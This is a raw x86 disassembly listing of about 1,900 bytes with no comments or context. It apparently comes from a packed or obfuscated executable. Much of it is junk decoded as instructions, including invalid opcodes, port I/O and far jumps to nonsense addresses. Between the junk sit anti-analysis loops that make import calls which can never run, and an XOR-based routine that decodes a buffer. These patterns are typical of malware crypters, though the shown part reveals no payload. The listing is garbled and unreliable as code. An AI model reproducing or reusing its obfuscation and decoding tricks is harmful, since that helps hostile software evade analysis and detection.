  4093b8:	cli    
  4093b9:	and    edx,ecx
  4093bb:	or     BYTE PTR [edi+0x5f52e32c],dh
  4093c1:	push   ebx
  4093c2:	gs sub eax,esp
  4093c5:	sar    DWORD PTR [ebx+0x3864545e],0x94
  4093cc:	repnz ss retf 
  4093cf:	repz dec esi
  4093d1:	test   bl,dh
  4093d3:	xor    esp,DWORD PTR [ebx+0x52]
  4093d6:	mov    dh,dh
  4093d8:	int3   
  4093d9:	cld    
  4093da:	mov    bh,BYTE PTR [edx+0xe]
  4093dd:	jo     0x4093c2
  4093df:	jno    0x4093c5
  4093e1:	pop    es
  4093e2:	push   edi
  4093e3:	fst    DWORD PTR ds:0x3e2bfe5c
  4093e9:	sub    al,0xc8
  4093eb:	icebp  
  4093ec:	daa    
  4093ed:	dec    edi
  4093ee:	in     al,0x36
  4093f0:	ins    BYTE PTR es:[edi],dx
  4093f1:	neg    BYTE PTR [eax]
  4093f3:	shrd   DWORD PTR ds:0x6e571a76,edx,0x94
  4093fb:	pop    edx
  4093fc:	test   eax,0x381beaf9
  409401:	test   eax,0x3998071c
  409406:	js     0x4093e1
  409408:	stc    
  409409:	jmp    0x34b3:0x6a40ce11
  409410:	cmp    al,0xf4
  409412:	scas   eax,DWORD PTR es:[edi]
  409413:	cmp    dl,cl
  409415:	stc    
  409416:	mov    edx,0x91084c63
  40941b:	cmp    bh,BYTE PTR [edx+0x5d9b9e58]
  409421:	lock dec ebx
  409423:	pushf  
  409424:	mov    dh,BYTE PTR [ecx+0x5587ac77]
  40942a:	pusha  
  40942b:	cli    
  40942c:	ficom  DWORD PTR [bx+di-0x54]
  409430:	or     ecx,edi
  409432:	sub    DWORD PTR [ebx-0x2de2312a],eax
  409438:	push   eax
  409439:	mov    dl,BYTE PTR [edi]
  40943b:	daa    
  40943c:	push   esi
  40943d:	pop    ebp
  40943e:	xor    eax,0x3be31800
  409443:	loop   0x409427
  409445:	inc    ebp
  409446:	je     0x40949e
  409448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409449:	lods   al,BYTE PTR ds:[esi]
  40944a:	mov    al,ds:0x7b6c7c32
  40944f:	mov    ch,0xa8
  409451:	std    
  409452:	sbb    ecx,DWORD PTR [ecx+edx*8-0x57]
  409456:	jno    0x4093d9
  409458:	mov    ds:0x47cfd870,al
  40945d:	jmp    0x5f8d:0x4f229011
  409464:	jne    0x409418
  409466:	and    DWORD PTR [edx-0x52],ebp
  409469:	mov    dh,0xc7
  40946b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40946c:	add    edi,DWORD PTR [ebx-0x1a]
  40946f:	daa    
  409470:	pop    eax
  409471:	int3   
  409472:	sub    ebx,ecx
  409474:	jle    0x409450
  409476:	or     eax,DWORD PTR [edi]
  409478:	dec    ecx
  409479:	xchg   ebx,eax
  40947a:	outs   dx,DWORD PTR ds:[esi]
  40947b:	(bad)  
  40947c:	mov    bh,0x9d
  40947e:	js     0x409400
  409480:	aam    0xc8
  409482:	in     eax,dx
  409483:	adc    bh,cl
  409485:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409486:	push   esi
  409487:	inc    eax
  409488:	push   ebx
  409489:	push   ecx
  40948a:	dec    eax
  40948b:	lods   eax,DWORD PTR ds:[esi]
  40948c:	adc    DWORD PTR [edi+ebx*4],edx
  40948f:	push   edi
  409490:	repnz pushf 
  409492:	cmp    BYTE PTR [edx-0x7e00ba76],dh
  409498:	xor    eax,0x424861
  40949d:	ror    DWORD PTR [ecx],0x0
  4094a0:	add    BYTE PTR [ebx+0x2581f04d],cl
  4094a6:	in     al,0xa6
  4094a8:	inc    esp
  4094a9:	add    dl,al
  4094ab:	jnp    0x4094ad
  4094ad:	add    BYTE PTR [ecx+ecx*2],dh
  4094b0:	sub    al,0x35
  4094b2:	mov    DWORD PTR ds:0x41074f,0x4e04
  4094bc:	mov    BYTE PTR [ecx],al
  4094be:	sbb    DWORD PTR ds:0x447990,0x3d76
  4094c8:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4094cf:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  4094d6:	or     ecx,0x8aa
  4094dc:	mov    eax,DWORD PTR [ebp-0x8]
  4094df:	and    DWORD PTR ds:0x44d410,0x0
  4094e9:	mov    ecx,DWORD PTR ds:0x44d410
  4094ef:	inc    ecx
  4094f0:	mov    DWORD PTR ds:0x44d410,ecx
  4094f6:	cmp    DWORD PTR ds:0x44d410,0x1e
  4094fd:	jne    0x40951b
  409503:	push   DWORD PTR [ebp-0x10]
  409506:	push   0x410939
  40950b:	push   0x41098d
  409510:	push   0x410939
  409515:	call   DWORD PTR ds:0x442040
  40951b:	cmp    DWORD PTR ds:0x44d410,0x11
  409522:	jb     0x4094e9
  409528:	xor    DWORD PTR ds:0x42484d,ebx
  40952e:	mov    ecx,0x7510857
  409533:	push   esi
  409534:	and    DWORD PTR ds:0x44a6d4,0x0
  40953e:	jmp    0x409550
  409543:	mov    esi,DWORD PTR ds:0x44a6d4
  409549:	inc    esi
  40954a:	mov    DWORD PTR ds:0x44a6d4,esi
  409550:	cmp    DWORD PTR ds:0x44a6d4,0x17
  409557:	jae    0x409585
  40955d:	cmp    DWORD PTR ds:0x44a6d4,0x1e
  409564:	jne    0x409580
  40956a:	push   0x4107a9
  40956f:	push   DWORD PTR [ebp-0x20]
  409572:	push   DWORD PTR [ebp-0x20]
  409575:	push   0x7787
  40957a:	call   DWORD PTR ds:0x4423a8
  409580:	jmp    0x409543
  409585:	xor    eax,ecx
  409587:	mov    esi,0x32729e
  40958c:	add    eax,esi
  40958e:	jmp    0x4095af
  409593:	mov    DWORD PTR ds:0x44a6e0,0x1147
  40959d:	mov    dl,BYTE PTR [ebp-0x1]
  4095a0:	mov    DWORD PTR ds:0x4479a4,0x2700
  4095aa:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  4095ae:	inc    eax
  4095af:	mov    DWORD PTR ds:0x44a6dc,0x2e0e
  4095b9:	cmp    eax,0x40
  4095bc:	jb     0x409593
  4095c2:	mov    edx,DWORD PTR [ebp-0x8]
  4095c5:	xor    DWORD PTR ds:0x41073f,0x7536
  4095cf:	mov    eax,DWORD PTR [ebp-0xc]
  4095d2:	add    DWORD PTR ds:0x4479a0,0x44d41c
  4095dc:	jmp    0x409732
  4095e1:	cmp    eax,ebx
  4095e3:	bound  edx,QWORD PTR [edx+0x65]
  4095e6:	push   0x39
  4095e8:	pop    ebx
  4095e9:	jmp    0x4095e6
  4095eb:	adc    al,0xc5
  4095ed:	div    DWORD PTR [eax-0x32493857]
  4095f3:	jl     0x409671
  4095f5:	daa    
  4095f6:	jg     0x409674
  4095f8:	jl     0x4095c5
  4095fa:	mov    ds:0x11c40a84,eax
  4095ff:	and    bh,ch
  409601:	add    DWORD PTR [ecx+0x12],0x7510fcad
  409608:	adc    DWORD PTR [eax-0x27],eax
  40960b:	push   ebp
  40960c:	pushf  
  40960d:	bnd jne 0x4095e5
  409610:	cmp    DWORD PTR [eax-0xa],eax
  409613:	pop    ebp
  409614:	cld    
  409615:	add    esi,ebx
  409617:	shr    DWORD PTR [edi+eax*1],1
  40961a:	(bad)  
  40961c:	test   DWORD PTR [edx],ebp
  40961e:	and    DWORD PTR [esi],0xffffffb6
  409621:	push   0xc32f43ec
  409626:	js     0x409651
  409628:	jns    0x4095e8
  40962a:	mul    DWORD PTR [esi]
  40962c:	pop    esi
  40962d:	inc    esi
  40962e:	sbb    dl,bh
  409630:	and    al,0xe8
  409632:	sti    
  409633:	sub    eax,0xee035482
  409638:	mov    ebx,0x4a49809c
  40963d:	mov    ebp,0xa07f5c83
  409642:	mov    bh,0xaa
  409644:	ret    
  409645:	jmp    0x4095f3
  409647:	pop    ss
  409648:	pop    edi
  409649:	and    DWORD PTR [edx-0x79c92684],0xffffffef
  409650:	mov    edx,0x92b6dc8
  409655:	push   edx
  409656:	je     0x4096d7
  409658:	mov    al,ds:0xadbb1994
  40965d:	jns    0x40961a
  40965f:	jb     0x40964a
  409661:	sub    ecx,esi
  409663:	fldenv [ebp+0x68498e63]
  409669:	rol    DWORD PTR [ecx+0x17],cl
  40966c:	pop    esi
  40966d:	mov    cl,0x58
  40966f:	sti    
  409670:	inc    edi
  409671:	inc    esp
  409672:	add    eax,0xcba8f473
  409677:	mov    eax,cs:0x28cab44
  40967d:	in     eax,dx
  40967e:	lods   eax,DWORD PTR ds:[esi]
  40967f:	into   
  409680:	das    
  409681:	daa    
  409682:	shl    BYTE PTR [ebp+0x6f19cae7],1
  409688:	xor    ebp,DWORD PTR [eax+0x1e21b8af]
  40968e:	jecxz  0x409709
  409690:	aas    
  409691:	iret   
  409692:	push   ebx
  409693:	and    BYTE PTR [ebx+0x34],dh
  409696:	cmp    BYTE PTR [ecx-0x56],bl
  409699:	and    BYTE PTR [eax-0x225b33c1],0x39
  4096a0:	bound  eax,QWORD PTR [ecx-0x97044c7]
  4096a6:	jo     0x40966e
  4096a8:	sub    BYTE PTR [esi+0x4],al
  4096ab:	in     al,0x4
  4096ad:	xchg   DWORD PTR [eax-0x70],esi
  4096b0:	ret    0x176a
  4096b3:	push   ebp
  4096b4:	pop    bp
  4096b6:	sub    eax,0xb02ac798
  4096bb:	xor    ah,0xf8
  4096be:	(bad)  
  4096bf:	xchg   ebp,eax
  4096c0:	add    DWORD PTR [edi],edi
  4096c2:	ins    BYTE PTR es:[edi],dx
  4096c3:	call   0x4a704b46
  4096c8:	rcr    ebx,0x1b
  4096cb:	stc    
  4096cc:	pop    ebx
  4096cd:	lods   al,BYTE PTR ds:[esi]
  4096ce:	push   ds
  4096cf:	jp     0x40971c
  4096d1:	aaa    
  4096d2:	iret   
  4096d3:	loopne 0x4096c3
  4096d5:	fidiv  DWORD PTR [ebp-0x539b4a19]
  4096db:	dec    esp
  4096dc:	rol    DWORD PTR [ecx],1
  4096de:	adc    eax,0x29035025
  4096e3:	shl    BYTE PTR [ebp+0x69],cl
  4096e6:	les    edx,FWORD PTR [ebp+0x49792ba9]
  4096ec:	jle    0x4096ab
  4096ee:	fdivr  QWORD PTR [eax]
  4096f0:	in     eax,dx
  4096f1:	pop    edi
  4096f2:	mov    eax,ds:0x11ade000
  4096f7:	loop   0x409725
  4096f9:	jno    0x409774
  4096fb:	enter  0xb105,0x7b
  4096ff:	adc    ch,BYTE PTR [esi+0x2f]
  409702:	jecxz  0x4096c2
  409704:	mov    cs,WORD PTR [edi-0x70]
  409707:	ret    0x73f3
  40970a:	or     al,0x33
  40970c:	pusha  
  40970d:	sub    al,0xb6
  40970f:	sbb    al,0xdd
  409711:	shl    DWORD PTR [edi],cl
  409713:	ds in  al,dx
  409715:	pop    esp
  409716:	xor    ah,al
  409718:	in     al,dx
  409719:	mov    ecx,0x5e894c54
  40971e:	shl    BYTE PTR [eax-0x688c94e8],1
  409724:	pop    ecx
  409725:	dec    edi
  409726:	pop    esi
  409727:	dec    edi
  409728:	sbb    BYTE PTR [edx],0xad
  40972b:	shl    DWORD PTR [ecx-0x34],cl
  40972e:	sbb    dl,BYTE PTR [edi-0x2eccfbc0]
  409734:	add    edx,esi
  409736:	mov    DWORD PTR ds:0x44799c,0x4464
  409740:	cmp    edx,eax
  409742:	mov    DWORD PTR ds:0x42485d,0xc14
  40974c:	je     0x40993f
  409752:	add    DWORD PTR ds:0x447998,0x1465
  40975c:	push   ebx
  40975d:	and    DWORD PTR ds:0x44a6d8,0x0
  409767:	mov    eax,ds:0x44a6d8
  40976c:	inc    eax
  40976d:	mov    ds:0x44a6d8,eax
  409772:	cmp    DWORD PTR ds:0x44a6d8,0x10
  409779:	jne    0x409785
  40977f:	call   DWORD PTR ds:0x4423ac
  409785:	cmp    DWORD PTR ds:0x44a6d8,0xf
  40978c:	jne    0x40979d
  409792:	mov    eax,ds:0x44a6d8
  409797:	inc    eax
  409798:	mov    ds:0x44a6d8,eax
  40979d:	cmp    DWORD PTR ds:0x44a6d8,0x1d
  4097a4:	jb     0x409767
  4097aa:	push   edi
  4097ab:	jmp    0x409901
  4097b0:	push   esp
  4097b1:	ss push edx
  4097b3:	std    
  4097b4:	push   edx
  4097b5:	jge    0x40981e
  4097b7:	pop    ebp
  4097b8:	add    al,0xa1
  4097ba:	or     eax,0x56b2840d
  4097bf:	shl    DWORD PTR [ecx-0x31],cl
  4097c2:	jl     0x409840
  4097c4:	daa    
  4097c5:	jg     0x409843
  4097c7:	jl     0x40974c
  4097c9:	xlat   BYTE PTR ds:[ebx]
  4097ca:	in     eax,0x8a
  4097cc:	or     al,BYTE PTR [esi]
  4097ce:	inc    ebp
  4097cf:	pop    edi
  4097d0:	mov    ecx,0x351e0d62
  4097d5:	sbb    eax,0x2d9c46d0
  4097da:	mov    eax,0x2ee36e23
  4097df:	(bad)  
  4097e0:	inc    DWORD PTR [ebx-0x365fd45d]
  4097e6:	pop    es
  4097e7:	inc    esi
  4097e8:	push   ds
  4097e9:	loope  0x4097a0
  4097eb:	fdivr  QWORD PTR [edi+0x78dae0c0]
  4097f1:	test   eax,0x611424bb
  4097f6:	imul   esi,DWORD PTR [eax+ecx*4-0x30],0xce72ec9b
  4097fe:	std    
  4097ff:	sbb    al,dh
  409801:	loopne 0x409878
  409803:	jae    0x409817
  409805:	push   ss
  409806:	and    DWORD PTR [edi-0x799b340e],ecx
  40980c:	(bad)  
  40980d:	stc    
  40980e:	sub    eax,0xb9682165
  409813:	(bad)  
  409814:	jmp    0x409800
  409816:	mov    al,0x6f
  409818:	sbb    BYTE PTR [edx],ch
  40981a:	std    
  40981b:	cmp    dh,0xde
  40981e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40981f:	xchg   edx,eax
  409820:	cmp    BYTE PTR [ecx+0x6d0729f6],0x21
  409827:	cmp    BYTE PTR [edx+esi*2-0x1],al
  40982b:	mov    eax,0xe772a691
  409830:	push   edi
  409831:	jae    0x4097f1
  409833:	aam    0x70
  409835:	xor    dh,ah
  409837:	push   0x64
  409839:	retf   0x6c76
  40983c:	test   al,0xdf
  40983e:	push   cs
  40983f:	je     0x4097d6
  409841:	cmp    BYTE PTR [ebx+0x2b38af50],dh
  409847:	inc    esi
  409848:	and    ch,cl
  40984a:	outs   dx,DWORD PTR ds:[esi]
  40984b:	xchg   ebx,eax
  40984c:	call   0x685:0xa00a01b9
  409853:	aad    0xe6
  409855:	(bad)  
  409856:	and    al,0x5d
  409858:	nop
  409859:	mov    WORD PTR [ecx+0xd],es
  40985c:	cwde   
  40985d:	pusha  
  40985e:	out    0xf2,eax
  409860:	fimul  DWORD PTR [ebx-0x67]
  409863:	enter  0x40bb,0xe
  409867:	clc    
  409868:	cwde   
  409869:	cdq    
  40986a:	inc    ebp
  40986b:	cmp    al,0xc6
  40986d:	adc    DWORD PTR [edi],eax
  40986f:	sbb    ecx,DWORD PTR [edi+edi*8-0x368fa76f]
  409876:	cwde   
  409877:	pop    ds
  409878:	iret   
  409879:	test   cl,cl
  40987b:	sub    eax,0xed5d4bcd
  409880:	and    BYTE PTR [eax],cl
  409882:	mov    esp,0x20a352d0
  409887:	add    ah,BYTE PTR [edx+eax*8-0x6a53c760]
  40988e:	and    cl,BYTE PTR [edi+0x4ac11134]
  409894:	inc    edx
  409895:	popf   
  409896:	les    edx,FWORD PTR [ecx]
  409898:	daa    
  409899:	jb     0x409824
  40989b:	dec    esp
  40989c:	jp     0x40984f
  40989e:	pop    esp
  40989f:	outs   dx,DWORD PTR ds:[esi]
  4098a0:	pop    ecx
  4098a1:	loope  0x409881
  4098a3:	paddsw mm6,QWORD PTR [ebp-0x2c]
  4098a7:	mov    dh,0x4
  4098a9:	or     esp,DWORD PTR [ebx+ebx*2-0x9]
  4098ad:	jl     0x409866
  4098af:	stos   BYTE PTR es:[edi],al
  4098b0:	add    ebx,ebp
  4098b2:	addr16 hlt 
  4098b4:	ret    
  4098b5:	aas    
  4098b6:	out    dx,al
  4098b7:	and    al,0x6d
  4098b9:	mov    dl,0x38
  4098bb:	push   0xd5c00372
  4098c0:	ror    BYTE PTR ds:0xe12cebc9,1
  4098c6:	in     al,dx
  4098c7:	or     DWORD PTR [esi+0x31],eax
  4098ca:	shl    DWORD PTR [esp+ebx*4-0x33fb1c8c],cl
  4098d1:	push   dx
  4098d3:	mov    edi,0x9fa3d65e
  4098d8:	aad    0x53
  4098da:	xchg   ebx,eax
  4098db:	(bad)  
  4098dc:	shl    BYTE PTR [edi-0x3fe09716],cl
  4098e2:	fsub   st(5),st
  4098e4:	sbb    edi,DWORD PTR es:[esi-0x4bf75bc1]
  4098eb:	dec    ebx
  4098ec:	add    al,0xb8
  4098ee:	adc    eax,edi
  4098f0:	add    esp,DWORD PTR [esi]
  4098f2:	pop    ecx
  4098f3:	dec    ecx
  4098f4:	or     BYTE PTR [esi+0x4d],0xef
  4098f8:	lods   al,BYTE PTR ds:[esi]
  4098f9:	xchg   bl,dh
  4098fb:	test   eax,0xd48a506b
  409900:	nop
  409901:	mov    edi,DWORD PTR [ebp+0x8]
  409904:	mov    eax,0x8a42
  409909:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40990e:	mov    edi,0x3b08
  409913:	add    ax,di
  409916:	movzx  eax,ax
  409919:	mov    DWORD PTR [ebp-0x14],eax
  40991c:	mov    eax,DWORD PTR [ebp+0x8]
  40991f:	movzx  eax,WORD PTR [eax+edx*4]
  409923:	xor    eax,0x8a42
  409928:	add    eax,edi
  40992a:	mov    edi,DWORD PTR [ebp-0x14]
  40992d:	mov    BYTE PTR [ebp+edi*1-0x58],al
  409931:	mov    eax,DWORD PTR [ebp-0xc]
  409934:	inc    edx
  409935:	cmp    edx,eax
  409937:	jne    0x409901
  40993d:	pop    edi
  40993e:	pop    ebx
  40993f:	mov    eax,DWORD PTR [ebp-0x8]
  409942:	mov    edx,DWORD PTR [ebp+0x10]
  409945:	xor    eax,ecx
  409947:	add    eax,esi
  409949:	mov    DWORD PTR [edx],eax
  40994b:	mov    eax,DWORD PTR [ebp-0x8]
  40994e:	xor    eax,ecx
  409950:	add    eax,esi
  409952:	mov    DWORD PTR [ebp+0x8],eax
  409955:	mov    eax,DWORD PTR [ebp+0x8]
  409958:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40995c:	mov    dl,BYTE PTR [ebp-0x1]
  40995f:	cmp    al,dl
  409961:	je     0x409afa
  409967:	mov    eax,DWORD PTR [ebp+0x8]
  40996a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40996e:	mov    edx,DWORD PTR [ebp+0xc]
  409971:	cmp    al,BYTE PTR [edx]
  409973:	jne    0x409b20
  409979:	mov    eax,DWORD PTR [ebp-0x8]
  40997c:	mov    edx,DWORD PTR [ebp+0xc]
  40997f:	movsx  edx,BYTE PTR [edx]
  409982:	xor    eax,ecx
  409984:	add    eax,esi
  409986:	cmp    edx,eax
  409988:	je     0x409b14
  40998e:	jmp    0x409ae4
  409993:	add    ah,ah
  409995:	clc    
  409996:	pop    es
  409997:	clc    
  409998:	sbb    esp,ebx
  40999a:	sti    
  40999b:	ins    DWORD PTR es:[edi],dx
  40999c:	sbb    BYTE PTR [esp+ebp*8],ch
  40999f:	inc    edx
  4099a0:	fisttp WORD PTR [edi]
  4099a2:	idiv   DWORD PTR [eax]
  4099a4:	into   
  4099a5:	jl     0x409a23
  4099a7:	daa    
  4099a8:	jg     0x409a26
  4099aa:	jl     0x4099a2
  4099ac:	jle    0x4099d0
  4099ae:	scas   al,BYTE PTR es:[edi]
  4099af:	ins    DWORD PTR es:[edi],dx
  4099b0:	jl     0x409946
  4099b2:	jmp    0xd4fd:0xbb818c74
  4099b9:	sahf   
  4099ba:	xchg   esi,eax
  4099bb:	std    
  4099bc:	(bad)  
  4099bd:	jecxz  0x409942
  4099bf:	push   0x53
  4099c1:	push   ecx
  4099c2:	add    al,0xf9
  4099c4:	retf   0xab0f
  4099c7:	xchg   DWORD PTR [eax+edi*4],esp
  4099ca:	fcom   QWORD PTR [ebp-0x4d]
  4099cd:	or     dh,ch
  4099cf:	lock pop eax
  4099d1:	cwde   
  4099d2:	ror    BYTE PTR [ecx],cl
  4099d4:	out    0xcf,al
  4099d6:	adc    ch,dh
  4099d8:	pop    ebp
  4099d9:	sti    
  4099da:	(bad)  
  4099dc:	lods   eax,DWORD PTR ds:[esi]
  4099dd:	ja     0x4099de
  4099df:	jmp    0xbddb22e2
  4099e4:	dec    ebx
  4099e5:	in     al,dx
  4099e6:	cmp    esp,DWORD PTR [ecx-0xd]
  4099e9:	ins    BYTE PTR es:[edi],dx
  4099ea:	arpl   WORD PTR [ecx],bx
  4099ec:	out    0xe4,al
  4099ee:	push   0x34777d15
  4099f3:	mov    al,0xc6
  4099f5:	mov    bh,0xa3
  4099f7:	mov    ecx,0x43cdf4fe
  4099fc:	xchg   DWORD PTR [edx-0x46],ecx
  4099ff:	lock outs dx,BYTE PTR ds:[esi]
  409a01:	adc    BYTE PTR [ebx],0xd6
  409a04:	xchg   BYTE PTR [ebp+ecx*8+0x492a52c7],bl
  409a0b:	pop    ds
  409a0c:	sub    ebp,esi
  409a0e:	pop    esi
  409a0f:	or     DWORD PTR [ecx],esi
  409a11:	and    al,0x8c
  409a13:	in     al,dx
  409a14:	sub    al,0xd9
  409a16:	pushf  
  409a17:	popf   
  409a18:	ja     0x409a2a
  409a1a:	or     BYTE PTR [esi-0x4223c94d],cl
  409a20:	xchg   ebx,eax
  409a21:	mov    ds:0x7d002f04,eax
  409a26:	push   DWORD PTR [edi-0x3b]
  409a29:	pop    edi
  409a2a:	mov    ebx,0x466ff243
  409a2f:	pminub mm2,QWORD PTR [eax]
  409a32:	sbb    al,0x27
  409a34:	add    al,0xab
  409a36:	pop    ds
  409a37:	mov    eax,ds:0x90d92fbd
  409a3c:	sbb    eax,0x4c3b7f9b
  409a41:	data16 lahf 
  409a43:	inc    edi
  409a44:	mov    ebx,0x55f5a072
  409a49:	cmp    eax,0x2ccaf7c6
  409a4e:	and    BYTE PTR [ebp-0x16fa78f0],dh
  409a54:	pop    ecx
  409a55:	mov    bl,0xea
  409a57:	(bad)  
  409a58:	mov    esi,0x36bba85
  409a5d:	scas   al,BYTE PTR es:[edi]
  409a5e:	mov    ecx,0x6f08eb37
  409a63:	rol    BYTE PTR [edi+0x3c400b35],cl
  409a69:	(bad)  
  409a6a:	fld    TBYTE PTR [edx]
  409a6c:	and    ecx,DWORD PTR [eax+0x39]
  409a6f:	or     al,0x1a
  409a71:	sub    ecx,ebx
  409a73:	sub    BYTE PTR [esi-0x6eb62636],bl
  409a79:	jne    0x409a47
  409a7b:	push   ds
  409a7c:	inc    eax
  409a7d:	inc    esi
  409a7e:	in     eax,0xe5
  409a80:	xor    dh,BYTE PTR [ebx]
  409a82:	add    bh,BYTE PTR [esi-0x516b2a3d]
  409a88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a89:	cmp    ebp,eax
  409a8b:	push   ebx
  409a8c:	xor    al,0xf6
  409a8e:	jnp    0x409a57
  409a90:	int3   
  409a91:	in     al,0xf3
  409a93:	ror    DWORD PTR [eax-0x628a2690],0x5e
  409a9a:	aas    
  409a9b:	and    bh,BYTE PTR [eax]
  409a9d:	cld    
  409a9e:	lods   al,BYTE PTR ds:[esi]
  409a9f:	mov    esi,0x61e82fec
  409aa4:	inc    edi
  409aa5:	fist   WORD PTR [ecx]
  409aa7:	push   esp
  409aa8:	mul    BYTE PTR [ebp+0x36]
  409aab:	lods   al,BYTE PTR ds:[esi]
  409aac:	jbe    0x409af6
  409aae:	sbb    eax,0x39b71a0a
  409ab3:	xor    DWORD PTR [ecx],ecx
  409ab5:	mov    eax,0x99c7bfbf
  409aba:	je     0x409a59
  409abc:	int3   
  409abd:	dec    eax
  409abe:	xchg   esi,eax
  409abf:	rcr    ebx,0xe5
  409ac2:	out    dx,al
  409ac3:	and    al,0xd4
  409ac5:	xchg   ecx,eax
  409ac6:	push   ebp
  409ac7:	cld    
  409ac8:	xlat   BYTE PTR ds:[ebx]
  409ac9:	ss test al,0x1e
  409acc:	push   ss
  409acd:	dec    ebp
  409ace:	add    al,0x9f
  409ad0:	jp     0x409aa0
  409ad2:	mov    esp,0x5250cb87
  409ad7:	(bad)  
  409ad9:	fld    DWORD PTR [eax+0x6ab4623d]
  409adf:	and    BYTE PTR [edi-0x38f6b2e0],al
  409ae5:	inc    ebp
  409ae6:	call   0x746987a
  409aeb:	lea    eax,[ebp-0x18]
  409aee:	mov    DWORD PTR [ebp-0x14],eax
  409af1:	mov    eax,DWORD PTR [ebp-0x14]
  409af4:	add    DWORD PTR [eax],0x705fa8f
  409afa:	mov    eax,DWORD PTR [ebp-0x10]
  409afd:	mov    edx,DWORD PTR [ebp+0x8]
  409b00:	xor    eax,ecx
  409b02:	lea    eax,[eax+edx*1+0x32729e]
  409b09:	mov    DWORD PTR [ebp+0x8],eax
  409b0c:	inc    DWORD PTR [ebp+0xc]
  409b0f:	jmp    0x409955
  409b14:	mov    eax,DWORD PTR [ebp-0x10]
  409b17:	xor    eax,ecx
  409b19:	mov    ecx,DWORD PTR [ebp+0x10]
  409b1c:	add    eax,esi
  409b1e:	mov    DWORD PTR [ecx],eax
  409b20:	pop    esi
  409b21:	leave  
  409b22:	ret    0xc
  409b25:	push   ebp
  409b26:	mov    ebp,esp
  409b28:	push   ecx
  409b29:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  409b30:	sub    DWORD PTR ds:0x41074b,edx
  409b36:	mov    eax,DWORD PTR [ebp+0x8]
  409b39:	jmp    0x409ca4
  409b3e:	push   cs
  409b3f:	xchg   BYTE PTR [esi],dl
  409b41:	fs xchg esi,eax
  409b43:	fs dec esi
  409b45:	data16 jg 0x409bb3
  409b48:	pop    esp
  409b49:	lds    esi,FWORD PTR [ebp-0x1ccf634e]
  409b4f:	sar    DWORD PTR [esp+edi*2-0x36],0x7f
  409b54:	jl     0x409bd2
  409b56:	sub    dh,BYTE PTR [edi+0x5f517144]
  409b5c:	outs   dx,BYTE PTR ds:[esi]
  409b5d:	mov    edi,0x1ea77b31
  409b62:	or     BYTE PTR [esi-0x2f20b48f],dl
  409b68:	push   eax
  409b69:	jns    0x409b56
  409b6b:	inc    eax
  409b6c:	pop    ebx
  409b6d:	stc    
  409b6e:	jmp    0x37e8:0x3fc8c3de
  409b75:	ja     0x409b3e
  409b77:	push   esi
  409b78:	sub    al,BYTE PTR [ebx+0x50]
  409b7b:	test   DWORD PTR [ebx-0x2545340e],ebx
  409b81:	cmc    
  409b82:	push   ecx
  409b83:	jb     0x409b9c
  409b85:	sub    DWORD PTR [eax+0x2833022],ebp
  409b8b:	sti    
  409b8c:	std    
  409b8d:	mov    bh,0x11
  409b8f:	out    dx,al
  409b90:	in     eax,dx
  409b91:	lods   eax,DWORD PTR ds:[esi]
  409b92:	rcr    BYTE PTR fs:[edx],0x71
  409b96:	mov    ebx,0x7ae15742
  409b9b:	mov    edx,0x1caa1fe1
  409ba0:	fisub  WORD PTR [ebx+0x1a]
  409ba3:	xor    ch,bl
  409ba5:	aas    
  409ba6:	mov    cs,ecx
  409ba8:	lahf   
  409ba9:	xchg   ebp,eax
  409baa:	cmc    
  409bab:	mov    BYTE PTR [edi+edi*4],dh
  409bae:	stos   BYTE PTR es:[edi],al
  409baf:	ror    DWORD PTR [ecx],1
  409bb1:	cmp    eax,0xc499892e
  409bb6:	sbb    bh,BYTE PTR [ebp-0x6e]
  409bb9:	pusha  
  409bba:	cld    
  409bbb:	push   ss
  409bbc:	fdiv   QWORD PTR [eax]
  409bbe:	xor    al,BYTE PTR [ebp+0x59]
  409bc1:	pop    ss
  409bc2:	add    ebx,DWORD PTR [eax+0x5a]
  409bc5:	inc    esi
  409bc6:	fadd   DWORD PTR [esi-0x321bff28]
  409bcc:	cmp    DWORD PTR [ebx+0x13afadac],0x84ec8864
  409bd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bd7:	add    DWORD PTR [eax-0x15],ebx
  409bda:	frstor [esi+0x2400e5d2]
  409be0:	(bad)  
  409be2:	jle    0x409c1c
  409be4:	pop    edx
  409be5:	xchg   esi,eax
  409be6:	cmp    eax,0x6aae52de
  409beb:	and    al,0xa6
  409bed:	sbb    BYTE PTR [ecx+ebx*8],dh
  409bf0:	push   eax
  409bf1:	jle    0x409c59
  409bf3:	(bad)  
  409bf4:	mov    dh,0xa1
  409bf6:	xchg   esp,eax
  409bf7:	jl     0x409bc3
  409bf9:	pusha  
  409bfa:	sub    BYTE PTR [eax-0x45],dh
  409bfd:	(bad)  
  409bfe:	or     al,0x6f
  409c00:	xchg   esi,eax
  409c01:	jp     0x409c48
  409c03:	xor    DWORD PTR [edx+0x15],ecx
  409c06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c07:	and    bl,cl
  409c09:	sub    al,0x3d
  409c0b:	jmp    0x409bff
  409c0d:	leave  
  409c0e:	mov    ecx,0xeab01e16
  409c13:	mov    eax,ds:0x17b2ee1f
  409c18:	xchg   esp,eax
  409c19:	jns    0x409be2
  409c1b:	test   eax,0x34a11dfa
  409c20:	inc    ebx
  409c21:	in     al,dx
  409c22:	(bad)  [edx-0x57f6dba3]
  409c28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c29:	add    DWORD PTR [ecx+eiz*4],edi
  409c2c:	add    DWORD PTR [esi-0x6af79f38],edx
  409c32:	ret    
  409c33:	mov    cl,0xbc
  409c35:	xor    al,0xa0
  409c37:	rol    DWORD PTR [ebx-0x184f3323],cl
  409c3d:	jne    0x409bef
  409c3f:	stos   DWORD PTR es:[edi],eax
  409c40:	loop   0x409bdc
  409c42:	jl     0x409cbd
  409c44:	(bad)  
  409c45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
